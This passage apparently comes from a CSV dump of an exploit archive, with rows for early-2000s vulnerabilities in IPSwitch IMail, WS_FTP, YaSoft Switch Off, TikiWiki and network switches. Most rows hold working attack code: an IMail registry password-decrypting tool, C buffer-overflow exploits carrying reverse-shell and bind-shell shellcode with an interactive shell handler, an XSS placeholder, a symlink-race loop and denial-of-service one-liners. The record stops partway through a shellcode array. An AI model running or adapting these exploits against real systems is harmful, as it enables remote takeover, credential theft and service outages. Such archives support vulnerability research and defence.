domIndex++;
while(domRes != ERROR_NO_MORE_ITEMS);
RegCloseKey(hKey);
printf(""\n Total:\t %d Domains, %d Accounts\n"",total_domainz,total_domain_accs);
void decrypt_usr_pass(char *usr,char *passwd)
char username[MAX_NUM]="""";
char passwordhash[MAX_NUM]="""";
char outputbuff[250]="""";
str2smallcase(usr);
strncpy(username,usr,sizeof(username)-1);
str2hex(passwd,passwordhash);
printf(""------------------------------------------------------------------------\n"");
printf( "" Username:\t\t %s\n""
"" Passwordhash:\t\t %s\n"",usr,passwd);
if(strlen(passwordhash)>strlen(username))
populate(username,strlen(passwordhash));
imail_decrypt(username,passwordhash,outputbuff);
printf("" Decrypted passwd:\t %s\n"",outputbuff);
printf(""------------------------------------------------------------------------\n"");
void main(int argc, char *argv[])
greetz();
if(argc ==2 && strncmp(argv[1],""-d"",2)==0 )
dump_registry_pwds();
else if(argc == 3 && strncmp(argv[1],""-d"",2)!=0)
decrypt_usr_pass(argv[1],argv[2]);
else
usage();
return;"
2004-07-13,Local,Linux,SEKINE Tatsuo,IM-Switch,Insecure Temporary File Handling Symbolic Link,source: https://www.securityfocus.com/bid/10717/info,"IM-Switch Insecure Temporary File Handling Symbolic Link VulnerabilityIt is reported that im-switch is prone to a local insecure temporary file handling symbolic link vulnerability. This issue is due to a design error that allows the application to insecurely write to a temporary file that is created with a predictable file name.
The im-switch utility will write to this temporary file before verifying its existence; this would facilitate a symbolic link attack.
An attacker may exploit this issue to corrupt arbitrary files. This corruption may potentially result in the elevation of privileges, or in a system wide denial of service.
$ bash -c 'i=1;while [ $i -lt 65536 ]; do ln -s /etc/IMPORTANT_FILE
/tmp/imswitcher$i; let ""i++""; done'"
2004-04-12,WebApps,PHP,JeiAr,TikiWiki Project 1.8,'tiki-switch_theme.php?theme' Cross-Site Scripting,source: https://www.securityfocus.com/bid/10100/info,"Multiple vulnerabilities have been identified in various modules of the application. These vulnerabilities may allow a remote attacker to carry out various attacks such as path disclosure, cross-site scripting, HTML injection, SQL injection, directory traversal, and arbitrary file upload.
tiki-switch_theme.php?theme=[XSS]"
2004-01-02,Remote,Windows,MrNice,YaSoft Switch Off 2.3,'swnet.dll' Remote Buffer Overflow,"// source: https://www.securityfocus.com/bid/9340/info
/* [Crpt] Switch Off 2.3 exploit by MrNice [Crpt] */
/* --------------------------------------------------------------- */
/* */
/* Coder : MrNice */
/* Released on : 07/01/2004 */
/* Tested on : 2k Sp0 & Xp sp0 */
/* Advisory : www.securiteam.com/windowsntfocus/5BP011FBPI.html*/
/* Tech : The overflow can be caused by supplying an overly*/
/* long 'message' parameter to the application. */
/* */
/* If a password has been set, you will have to have*/
/* logged in to the server before issuing a */
/* malicious request to cause the overflow. */
/* www.coromputer.net && #coromputer on underet */
/******C***O***R***O***M***P***U***T***E***R*****2***0***0***4******/
#ifdef _WIN32
#include <winsock.h>
#include <windows.h>
#define close closesocket
#pragma comment (lib,""ws2_32"")
#else
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>
#endif
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
//#define JMP_ESP_2K ""\x1F\xE5\xC7\x77"" //2k sp0 FR
//#define JMP_ESP_XP ""\xE7\x80\x9C\x71"" //xp pro sp0 FR
#define JMP_ESP_2K ""\xB8\x64\x75\x71""
#define JMP_ESP_XP ""\xC1\x1C\x35\x77""
//Reverse Shell from Metasploit
//Fonction who set the shellcode coded by Kralor[crpt]
#ifdef _WIN32
#endif
#ifdef _WIN32
#endif
//Cr�ation de la socket
//GetHostByName()
//Preparation de la struct sockaddr_in","A vulnerability has been identified in the YaSoft Switch Off software package when handling message requests. The buffer overrun condition exists in the 'swnet.dll' module of the software due to insufficient bounds checking performed by the affected component. The overflow may be caused by sending an excessively long 'message' parameter to the application. This may make it possible for a remote user to execute arbitrary code through a vulnerable server.
char ReversShell[]= //Dexorer without call (ff..) coded by MrNice
""\x83\xEC\x50\xD9\xE1\xD9\x34\x24\x5B\x5B\x5B\x5B\x80\xEB\xE7\x33""
""\xC9\x66\x81\xC1\x4F\x01\x80\x33\x96\x43\xE2\xFA""
""\x7e\xa6\x96\x96\x96\xd5\xdb\xd2\x96\x71\xef\x50\xef\x7a\x6f\x3c""
""\xf6\x4f\x9f\x63\x3b\x5d\x7b\x6a\xad\x18\xd8\x98\x7a\xe8\x4e\x74""
""\xe5\x3b\x4f\x93\x58\xe4\x68\x25\x80\xc1\xc5\xa4\xc9\xa5\xa4\xb8""
""\xd2\xda\xda\x96\x97\xcd\xc2\x1f\x73\x1f\xcb\x96\xfc\xa6\xcf\xf2""
""\x1d\x97\x1d\xd6\x9a\x1d\xe6\x8a\x3b\x1d\xce\x9e\x7d\x9a\x1b\xc1""
""\xb2\xc7\xc4\x69\x46\x1f\x55\xcf\x7d\x86\xfc\x9e\xc8\x97\x78\xfc""
""\x9e\xcf\x1d\xeb\x96\x16\x6f\x92\xe2\x72\xc7\xc5\x69\xa2\x19\x7e""
""\x15\x96\x96\x96\xcf\x1f\x92\x18\x74\x7d\xa7\x69\xf0\x17\x7a\x06""
""\x97\xc2\xfe\x97\x97\x96\x96\x69\xc3\x8e\xc1\xc1\xc1\xc1\xd1\xc1""
""\xd1\xc1\x69\xc3\x82\x1f\x55\xa7\x69\xfe\x56\x3e\x96\x61\xfe\x94""
""\x96\xb4\x87\x1f\x77\xfc\x86\xc7\xc5\x69\xc3\x86\x13\x56\xe3\xd2""
""\x1b\xaa\xb2\xa7\x56\xfc\x83\xcf\x65\x3d\x50\xd2\xb2\x86\xd2\x68""
""\xd2\xb2\xab\x1f\xca\xb2\xde\x1f\xca\xb2\xda\x1f\xca\xb2\xc6\x1b""
""\xd2\xb2\x86\xc2\xc6\xc7\xc7\xc7\xd7\xc7\xdf\xc7\xc7\x69\xe3\x96""
""\xc7\x69\xc3\xbe\x1f\x77\xfe\x69\x69\x69\x69\x69\xa7\x69\xc3\xb2""
""\xc1\x69\xc3\x9a\x69\xc3\xb6\xc5\xc3\xc0\xc1\x1d\xfa\xb2\x8e\x1d""
""\xd3\xaa\x1d\xc2\x93\xee\x97\x7c\x1d\xdc\x8e\x1d\xcc\xb6\x97\x7d""
""\x75\xa4\xdf\x1d\xa2\x1d\x97\x78\xa7\x69\x6a\xa7\x56\x3a\xae\x76""
""\xe2\x91\x57\x59\x9b\x97\x51\x7d\x64\xad\xea\xb2\x82\xe3\x77\x1d""
""\xcc\xb2\x97\x7d\xf0\x1d\x9a\xdd\x1d\xcc\x8a\x97\x7d\x1d\x92\x1d""
""\x97\x7e\x7d\x94\xa7\x56\x1f\x7c\xc9\xc8\xcb\xcd\x54\x9e\x96"";
void set_sc(char *rhost, int rport, char *shellc0de)
unsigned int ip=0;
unsigned short port=0;
char *port_to_shell="""",*ip1="""";
ip = inet_addr(rhost); ip1 = (char*)&ip;
shellc0de[182]=ip1[0]^0x96;shellc0de[183]=ip1[1]^0x96;
shellc0de[184]=ip1[2]^0x96; shellc0de[185]=ip1[3]^0x96;
port = htons(rport);
port_to_shell = (char *) &port;
shellc0de[189]=port_to_shell[0]^0x96;
shellc0de[190]=port_to_shell[1]^0x96;
void banner()
printf(""\n\t [Crpt] Switch Off 2.3 Remote Exploit by MrNice [Crpt]\n"");
printf(""\t\t www.coromputer.net && Undernet #coromputer\n"");
printf(""\t---------------------------------------------------------------\n\n"");
void usage(char *exe)
printf(""\n\t [Crpt] Switch Off 2.3 Remote Exploit by MrNice [Crpt]\n"");
printf(""\t\t www.coromputer.net && Undernet #coromputer\n"");
printf(""\t---------------------------------------------------------------\n\n"");
printf(""Syntax : %s <ip_vulnerable> <your_ip> <listening_port> <cible>\n"",exe);
printf(""\nCible : \t0 - Windows 2000 (default)\n"");
printf(""\t\t1 - Windows Xp\n\n"");
exit (-1);
int main(int argc, char *argv[])
int hsocket;
struct hostent *host;
struct in_addr adresseIP;
struct sockaddr_in adressesocket;
char BadString[700],Request[800];
int i,len,cible=0;
WSADATA wsaData;
if(argc<4)
usage(argv[0]);
if(argc>4)
cible=atoi(argv[4]);
banner();
if(WSAStartup(0x101,&wsaData))
printf(""[-] Unable to load winsock\n"");
exit (-1);
else
printf(""[+] Winsock loaded\n"");
if((hsocket=socket(AF_INET,SOCK_STREAM,0))==-1)
printf(""[-] Can't creat Socket\n"");
exit (-1);
else
printf(""[+] Socket created\n"");
if((host=gethostbyname(argv[1]))==0)
printf(""[-] Can't acquire remote info\n"");
close(hsocket);
exit (-1);
else
printf(""[+] Remote info Acquired\n"");
memcpy(&adresseIP,host->h_addr,host->h_length);
memset(&adressesocket,0,sizeof(struct sockaddr_in));
adressesocket.sin_family=AF_INET;
adressesocket.sin_port=htons(8000);
memcpy(&adressesocket.sin_addr,host->h_addr,host->h_length);
if(connect(hsocket,(struct sockaddr *)&adressesocket,sizeof(struct sockaddr_in))==-1)
printf(""[-] Can't connect on %s:8000\n"",argv[1]);
close(hsocket);
exit (-1);
else
printf(""[+] Connected on %s:8000\n"",argv[1]);
set_sc(argv[2], atoi(argv[3]),ReversShell);
printf(""[+] Reverse ShellCode built\n"",argv[1]);
for(i=0;i<700;i++)
BadString[i]=(char)0x90;
for(i=260;i<623;i++)
BadString[i]=ReversShell[i-260];
if(cible==0)
memcpy(&BadString[256],JMP_ESP_2K,4);
else
memcpy(&BadString[256],JMP_ESP_XP,4);
BadString[700]=0x00;
memset(Request,'\x00',sizeof(Request));
sprintf(Request,""GET /action.htm?action=SendMsg&message=%s HTTP/1.1\r\n""
""Host: 10.0.0.6:8000\r\n""
""\r\n"",BadString);
printf(""[+] BadString constructed\n"");
if((len=send(hsocket,Request,strlen(Request),0))==-1)
printf(""[-] Error on sending BadString\n"");
close(hsocket);
exit (-1);
else
printf(""[+] BadString Sended (%d)\n"",len);
return 0;"
2004-01-02,DoS,Hardware,Peter Winter-Smith,YaSoft Switch Off 2.3,Large Packet Remote Denial of Service,source: https://www.securityfocus.com/bid/9339/info,"A problem has been identified in the YaSoft Switch Off software package when handling large packets via the service management port (8000/TCP). This may make it possible for a remote user to deny service to legitimate users of the service.
perl -e ""print 'a'x10240 . chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a);"" > DoS.txt
nc 127.0.0.1 8000 < DoS.txt"
1998-03-10,DoS,Windows,Rootshell,Ipswitch Imail Server 5.0,SMTP HELO Argument Buffer Overflow,"// source: https://www.securityfocus.com/bid/8621/info
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>","It has been reported that Ipswitch IMail server is prone to an SMTP HELO command argument buffer overflow vulnerability.
The issue presents itself likely due to insufficient bounds checking performed when handling malicious SMTP HELO command arguments of excessive length. It has been reported that a remote attacker may exploit this condition to trigger a denial of service in the affected daemon.
* MDaemon SMTP server for Windows buffer overflow exploit
* http://www.mdaemon.com - if you dare...
* Tested on MDaemon 2.71 SP1
* http://www.rootshell.com/
* Released 3/10/98
* (C) 1998 Rootshell All Rights Reserved
* For educational use only. Distribute freely.
* Note: This exploit will also crash the Microsoft Exchange 5.0 SMTP mail
* connector if SP2 has NOT been installed.
* Danger!
* A malicous user could use this bug to execute arbitrary code on the
* remote system.
void main(int argc, char *argv[])
struct sockaddr_in sin;
struct hostent *hp;
char *buffer;
int sock, i;
if (argc != 2) {
printf(""usage: %s <smtp server>\n"", argv[0]);
exit(1);
hp = gethostbyname(argv[1]);
if (hp==NULL) {
printf(""Unknown host: %s\n"",argv[1]);
exit(1);
bzero((char*) &sin, sizeof(sin));
bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
sin.sin_family = hp->h_addrtype;
sin.sin_port = htons(25);
sock = socket(AF_INET, SOCK_STREAM, 0);
connect(sock,(struct sockaddr *) &sin, sizeof(sin));
buffer = (char *)malloc(10000);
sprintf(buffer, ""HELO "");
for (i = 0; i<4096; i++)
strcat(buffer, ""x"");
strcat(buffer, ""\r\n"");
write(sock, &buffer[0], strlen(buffer));
close(sock);
free(buffer);"
2003-09-04,Remote,Windows,xfocus,Ipswitch WS_FTP Server 3.4/4.0,FTP Command Buffer Overrun,"// source: https://www.securityfocus.com/bid/8542/info
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#pragma comment(lib,""ws2_32"")
#define maxlen (0x200-1)//???????????
#define overpoint (0x118+4)//???
#define sc_jmp_addr_offset (0xa4+22)//sc???jmp addr?offset
#define mini_path 0xf//????
#define ERR_EXP_OK 0
#define ERR_EXP_CONNECT -1
#define ERR_EXP_FAILED 1
#define version ""1.0""
//modify it by yourself
//total = 366 (0x16E) bytes (xor with 0x93)
//decoder 22 bytes ->???????sc??
//sc_bind_1981 for 2k/xp/2003 by ey4s
//speacial version for ws_ftp base on v1.03.10.07
//XOR with 0x93 (367 0x16F bytes)
//decode end sign
/* ripped from TESO code and modifed by ey4s for win32 */
//??path????,??buff????0x200,??????:)","Ipswitch WS_FTP Server is reported to be prone to buffer overruns when handling data supplied to the APPE and STAT FTP commands. An FTP user who supplies excessive input to these commands could potentially execute arbitrary code in the context of the server or cause a denial of service.
* http://www.k-otiK.com/exploits/x-ws_ftp.c
* x-ws_ftp.c - x86/win32 WS_FTP FTPD ""STAT"" command remote
* stack buffer overflow exploit
* (C) COPYRIGHT XFOCUS Security Team, 2003
* All Rights Reserved
* -----------------------------------------------------------------------
* Author : eyas <eyas@xfocus.org>
* : http://www.xfocus.org
* Maintain : XFOCUS Security Team <security@xfocus.org>
* Version : 1.0
* Test : Windows 2000 server EN
* + WS_FTP Server 4.0.1.EVAL (46006050)
* Notes : This vul discover by Dvdman@l33tsecurity.com!
* To exploit this vul, you must have a account can login into ws_ftp.
* Greets : dvdman and all member of XFOCUS Security Team.
* Complie : cl x-ws_ftp.c
* Usage : x-ws_ftp.exe <-i ip> <-t type> <-u user> <-p pass> [-l pathlen] [-P port]
* [type]
* 0 win2k sp4 user32.dll
* Add more targets's jmp esp addr by yourself,
* and then pls email a copy to me, thanks. :)
* Date : 2003-10-08
* Revised :
* Revise History:
* ------- start rip from dvdman's exp -----------------
* VULN VERSIONS: <= X2 WS_FTP Server 4.0.1 (1323562169)
* VULN COMMANDS: APPE,STOR,STAT,RMD,RNFR,RNTO,AND MORE
* -------- rip end ------------------------------------
struct
DWORD dwJMP;
char *szDescription;
}targets[] =
{0x77E14C29, ""win2k sp4 user32.dll""},
},v;
unsigned char sc_bind_1981[]=
""\xEB\x0F\x5B\x80\x33\x93\x43\x81\x3B\x45\x59\x34\x53\x75\xF4\x74""
""\x05\xE8\xEC\xFF\xFF\xFF""
""\x12\x7F\x93\x91\x93\x93\x7A\xA4\x92\x93\x93\xCC\xF7\x32\xA3\x93""
""\x93\x93\x18\xD3\x9F\x18\xE3\x8F\x3E\x18\xFB\x9B\xF9\x97\xCA\x7B""
""\x4A\x93\x93\x93\x71\x6A\xFB\xA0\xA1\x93\x93\xFB\xE4\xE0\xA1\xCC""
""\xC7\x6C\xC4\x6F\x18\x7B\xF9\x95\xCA\x7B\x2C\x93\x93\x93\x71\x6A""
""\x12\x7F\x03\x92\x93\x93\xC7\xFB\x91\x91\x93\x93\x6C\xC4\x7B\xC3""
""\xC3\xC3\xC3\xF9\x92\xF9\x91\x6C\xC4\x63\x18\x4B\x18\x7F\x54\xD6""
""\x93\x91\x93\x94\x2E\xA0\x53\x1A\xD6\x97\xF9\x83\xC6\xC0\x6C\xC4""
""\x67\xC0\xF9\x92\xC0\x6C\xC4\x6B\xC3\xC3\xC0\x6C\xC4\x6F\xC3\x10""
""\x7F\xCB\x18\x67\xA0\x48\xF9\x83\xCA\x1A\x8F\x1D\x71\x68\x78\xBF""
""\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3""
""\xD3\xD3\xD3\xD3\x03\x03\x03\x03\xD3\xD3\xD3\xD3\xD3\xD3\xD3\xD3""
""\xE9\x35\xFF\xFF\xFF\xD3\xD3\xD3\xD3\xD3\xD3\xD3\x1A\xD5\xAB\x1A""
""\xD5\xAF\x1A\xD5\xD3\x54\xD5\xBF\x92\x92\x93\x93\x1E\xD5\xD7\xC3""
""\xC5\xC0\xC0\xC0\xF9\x92\xC0\xC0\x1E\xD5\xC7\x54\x93\xF0\xFE\xF7""
""\x93\xC3\xC0\x6C\xC4\x73\xA0\x53\xDB\xC3\x6C\xE5\xD7\x6C\xC4\x4F""
""\x10\x57\xCB\x6C\xC4\x7F\x6C\xC4\x7F\xC3\x6C\xC4\x4B\xC2\x18\xE6""
""\xAF\x18\xE7\xBD\xEB\x90\x66\xC5\x18\xE5\xB3\x90\x66\xA0\x5A\xDA""
""\xD2\x3E\x90\x56\xA0\x48\xA0\x41\x9C\x2D\x83\xA9\x45\xE7\x9B\x52""
""\x58\x88\x90\x49\xD3\x78\x7C\xA8\x8C\xE6\x76\xCD\x18\xCD\xB7\x90""
""\x4E\xF5\x18\x9F\xD8\x18\xCD\x8F\x90\x4E\x18\x97\x18\x90\x56\x38""
""\xCA\x50\x7B\x57\x6D\x6C\x6C\x7A\x28\x50\x3D\x27\xEE\x86\x0B\x58""
""\xD1\xE4\x2B\x4F\x4E\x89\xA0\xBE\x87\xC5\x3D\x55\xB8\x2E\xBD\x4D""
""\xC4\xE1\x37\xB7\x21\xA1\x93\x9D\xCE\x58\x4D\xE7\xB1\xF0\x5B""
""\x45\x59\x34\x53"";
unsigned char *szSend[3];
unsigned char szSTAT[0x1000];
int iType;
int iPort=21;
char *ip=NULL, *pUser=NULL, *pPass=NULL;
char user[128],pass[128];
void shell (int sock);
void usage(char *p);
int SendExploit(int iPathLen);
void main(int argc, char **argv)
int i, iPathLen=0, ret;
printf( ""WS_FTP FTPD remote stack buffer overflow exp v%s\n""
""This version can exploit WS_FTP Server 4.0.1.EVAL\n""
""Vul discover by Dvdman@l33tsecurity.com\n""
""Code by eyas@xfocus.org\n""
""http://www.xfocus.net\n""
""Create: 2003-10-08\n"", version);
if(argc < 9)
usage(argv[0]);
return;
for(i=1;i<argc;i+=2)
if(strlen(argv[i]) != 2)
usage(argv[0]);
return;
if(i == argc-1)
usage(argv[0]);
return;
switch(argv[i][1])
case 'i':
ip=argv[i+1];
break;
case 't':
iType = atoi(argv[i+1]);
break;
case 'P':
iPort=atoi(argv[i+1]);
break;
case 'p':
pPass = argv[i+1];
break;
case 'u':
pUser=argv[i+1];
break;
case 'l':
iPathLen=atoi(argv[i+1]);
break;
if((!ip) || (!user) || (!pass))
usage(argv[0]);
printf(""[-] Invalid parameter.\n"");
return;
if( (iType<0) || (iType>=sizeof(targets)/sizeof(v)) )
usage(argv[0]);
printf(""[-] Invalid type.\n"");
return;
if( (iPathLen>0) && (iPathLen<mini_path) )
printf(""[-] Hey, guy, mini path is %d.\n"", mini_path);
return;
_snprintf(user, sizeof(user)-1, ""USER %s\r\n"", pUser);
user[sizeof(user)-1]='\0';
_snprintf(pass, sizeof(pass)-1, ""PASS %s\r\n"", pPass);
pass[sizeof(pass)-1]='\0';
szSend[0] = user;//user
szSend[1] = pass;//pass
szSend[2] = szSTAT;
if(iPathLen)
SendExploit(iPathLen);
else
for(i=mini_path;;i++)
ret = SendExploit(i);
switch(ret)
case ERR_EXP_FAILED:
break;
case ERR_EXP_CONNECT:
case ERR_EXP_OK:
return;
break;
return;
void shell (int sock)
int l;
char buf[512];
struct timeval time;
unsigned long ul[2];
time.tv_sec = 1;
time.tv_usec = 0;
while (1)
ul[0] = 1;
ul[1] = sock;
l = select (0, (fd_set *)&ul, NULL, NULL, &time);
if(l == 1)
l = recv (sock, buf, sizeof (buf), 0);
if (l <= 0)
printf (""[-] Connection closed.\n"");
return;
l = write (1, buf, l);
if (l <= 0)
printf (""[-] Connection closed.\n"");
return;
else
l = read (0, buf, sizeof (buf));
if (l <= 0)
printf(""[-] Connection closed.\n"");
return;
l = send(sock, buf, l, 0);
if (l <= 0)
printf(""[-] Connection closed.\n"");
return;
void usage(char *p)
int i;
printf( ""Usage: %s <-i ip> <-t type> <-u user> <-p pass> [-l pathlen] [-P port]\n""
""[type]\n"", p);
for(i=0;i<sizeof(targets)/sizeof(v);i++)
printf(""%d\t%s\n"", i, targets[i].szDescription);
int SendExploit(int iPathLen)
struct sockaddr_in sa, server;
WSADATA wsd;
SOCKET s,s2;
int i,iErr, ret, pad1,pad2;
char szRecvBuff[0x1000];
int retcode = ERR_EXP_CONNECT;
printf(""\n[+] -=-= Try type %d, path %d. -=-=\n"", iType, iPathLen);
memcpy(&sc_bind_1981[sc_jmp_addr_offset], &targets[iType].dwJMP, 4);
memset(szSTAT, 0, sizeof(szSTAT));
strcpy(szSTAT, ""STAT "");
pad1 = overpoint - sc_jmp_addr_offset - iPathLen;
if(pad1<0)
printf( ""[-] You can't try any more, path reach the max vaule.\n""
"" If you want to try longer path, change the sc by
yourself.\n"");
exit(1);
for(i=0;i<pad1;i++)
strcat(szSTAT, ""a"");
strcat(szSTAT, sc_bind_1981);
pad2 = maxlen - overpoint;
pad2 -= (sizeof(sc_bind_1981)-1-sc_jmp_addr_offset);
if(pad2<0)
printf(""[-] shellcode too long.\n"");
exit(1);
for(i=0;i<pad2;i++)
strcat(szSTAT, ""b"");
strcat(szSTAT, ""\r\n"");
if(strlen(szSTAT) >= sizeof(szSTAT))
printf(""[-] stack buffer overflow.\n"");
exit(1);
__try
if (WSAStartup(MAKEWORD(1,1), &wsd) != 0)
printf(""[-] WSAStartup error:%d\n"", WSAGetLastError());
__leave;
s=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
if(s == INVALID_SOCKET)
printf(""[-] Create socket failed:%d"",GetLastError());
__leave;
sa.sin_family=AF_INET;
sa.sin_port=htons(iPort);
sa.sin_addr.S_un.S_addr=inet_addr(ip);
iErr = connect(s,(struct sockaddr *)&sa,sizeof(sa));
if(iErr == SOCKET_ERROR)
printf(""[-] connect to target:21 error:%d\n"", GetLastError());
__leave;
printf(""[+] connect to %s:%d success.\n"", ip, iPort);
Sleep(1000);
for(i=0;i<sizeof(szSend)/sizeof(szSend[0]);i++)
memset(szRecvBuff, 0, sizeof(szRecvBuff));
iErr = recv(s, szRecvBuff, sizeof(szRecvBuff), 0);
if(iErr == SOCKET_ERROR)
printf(""[-] recv buffer error:%d.\n"", WSAGetLastError());
__leave;
printf(""[+] Recv: %s"", szRecvBuff);
iErr = send(s, szSend[i], strlen(szSend[i]),0);
if(iErr == SOCKET_ERROR)
printf(""[-] send buffer error:%d.\n"", WSAGetLastError());
__leave;
if(i==sizeof(szSend)/sizeof(szSend[0])-1)
printf(""[+] Send shellcode %d(0x%X) bytes.\n"", iErr, iErr);
else
printf(""[+] Send: %s"", szSend[i]);
Sleep(100);
printf(""[+] Wait from shell.\n"");
Sleep(2000);
s2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
server.sin_family = AF_INET;
server.sin_port = htons(1981);
server.sin_addr.s_addr=inet_addr(ip);
ret = connect(s2, (struct sockaddr *)&server, sizeof(server));
if(ret!=0)
printf(""[-] Exploit seem failed.\n"");
retcode = ERR_EXP_FAILED;
__leave;
printf(""[+] Exploit success! Have fun! :)\n"");
shell(s2);
retcode = ERR_EXP_OK;
__finally
if(s != INVALID_SOCKET) closesocket(s);
if(s2 != INVALID_SOCKET) closesocket(s);
WSACleanup();
return retcode;"
2003-06-18,DoS,Hardware,Jacek Lipkowski,Avaya Cajun P130/P133/P330/P333 Network Switch,Connection Stalling Denial of Service,source: https://www.securityfocus.com/bid/7961/info,"It has been reported that Cajun switches do not properly handle traffic to port 4000. Because of this, an attacker may be able to cause the switch to stall for period of time.
The following proof of concept string has been made available:
\x80dupa"
2002-09-24,DoS,Hardware,Brook Powers,HP Procurve 4000M Switch,Device Reset Denial of Service,"source: https://www.securityfocus.com/bid/5784/info
http://<IP ADDRESS>/sw2/cgi/device_reset?","When multiple Procurve switches are used interconnected, it is common for an administrator to enable a feature allowing each switch to be viewed through a single interface, accessible via the web.
It has been reported that HP Procurve Switches are vulnerable to a denial of service attack, when used in a ""stack"" configuration. It is possible for an attacker to reset member switches by issuing a device reset command to a vulnerable device. Vulnerable devices do not require authentication before accepting this command.
It should be noted that the web interface is not enabled by default."
2002-09-13,DoS,Hardware,Mella Marco,Enterasys SSR8000 SmartSwitch,Port Scan Denial of Service,source: https://www.securityfocus.com/bid/5703/info,"The SSR8000 is a SmartSwitch distributed and maintained by Enterasys.
It has been discovered that SSR8000 switches react unpredictably when portscanned. When these switches are scanned using specific types of TCP traffic, and scanned on certain ports, the switch becomes unstable. It has been reported that this can be reproduced consistently to cause the switch to crash.
nmap -PT 10.2.1.1 -p '15077-15078'"
2002-07-30,DoS,Windows,anonymous,IPSwitch IMail 6.x/7.0.x,Web Calendaring Incomplete Post Denial of Service,source: https://www.securityfocus.com/bid/5365/info,"IMail is a commercial email server software package distributed and maintained by Ipswitch, Incorporated. IMail is available for Microsoft Operating Systems.
When a HTTP POST command is made to the web calendaring service on port 8484, and the ""content-length:"" header field is blank, the service becomes unstable. It has been reported that such a transaction with the service results in a crash of the iwebcal service.
An attacker may exploit this vulnerability by submitting the following request to a vulnerable server:
POST / HTTP/1.0"
2002-07-27,DoS,Hardware,FX,HP ProCurve Switch 4000M,SNMP Write Denial of Service,source: https://www.securityfocus.com/bid/5336/info,"An issue has been reported with the HP ProCurve 4000M Switch.
An attacker with SNMP write access to the device may write to the SNMP variable .iso.3.6.1.4.1.11.2.36.1.1.2.1.0. If more than 85 characters are written to this variable, the device will crash the next time it accepts a connection to either the configured telnet or HTTP port.
snmpwrite <switch_ip> private .iso.3.6.1.4.1.11.2.36.1.1.2.1.0 s `perl -e 'print ""A""x85;'`"
2002-07-25,Remote,Windows,anonymous,IPSwitch IMail 6.x/7.0/7.1,Web Messaging GET Buffer Overflow,"// source: https://www.securityfocus.com/bid/5323/info
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/errno.h>
#include <unistd.h>
// dark spyrit's shell as per usual.. queerly modified to call ExitThread
// yet again.. all that shit on top is to get us home","IMail is a commercial email server software package distributed and maintained by Ipswitch, Incorporated. IMail is available for Microsoft Operating Systems.
The web messaging server is vulnerable to a buffer overflow. When the server receives a request for HTTP version 1.0, and the total request is 96 bytes or greater, a buffer overflow occurs. This could result in the execution of attacker-supplied instructions, and potentially allow an attacker to gain local access.
** Ipswitch has reported they are unable to reproduce this issue. In addition, Ipswitch has stated that the supplied, third party patch may in fact open additional vulnerabilities in the product. Ipswitch suggests that users do not apply the supplied patch.
imailexp.c
July 25th, 2002
IPSwitch IMail 7.11 remote 'SYSTEM' exploit
there is an overflow in the GET parameter under the HTTP/1.0
specification in the Web Messaging daemon in all IMail versions
to date
<96 bytes><EBP><EIP>
since none of the registers point to our payload on ret some
trickery was necessary to hit our payload in a dynamic way,
but nothing difficult..
execution flow:
eip overran, ret (esp-4) -> land at pop ebx, ret10 (esp-18) -> call esp
reach corrupted payload
preserve esp -> sub esp -> jmp esp
preserve esp, and jump to good payload
recover esp -> execute shell
let shit fly
""In 1995, Ipswitch released IMail Server, the first commercial NT Mail Server.
Seven years later there are over 49 million users of IMail worldwide.
IMail Server 7.1
Greater security, improved usability, and new revenue opportunities for service
providers.""
7 years in development, 20 minutes of BuffSex v0.3(tm), 4 remote 'root' holes
2c79cbe14ac7d0b8472d3f129fa1df55 (c79cbe14ac7d0b8472d3f129fa1df55@yahoo.com)
unsigned char payload[] =
""\x47\x45\x54\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x24\x01\x10\x90\x90\x90\x90\x13\xf7\x02\x10""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x8b\xfc\x81\xc4\x11\x11\x11\x11\x81\xec""
""\x50\xdd\x10\x11\xff\xe4\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
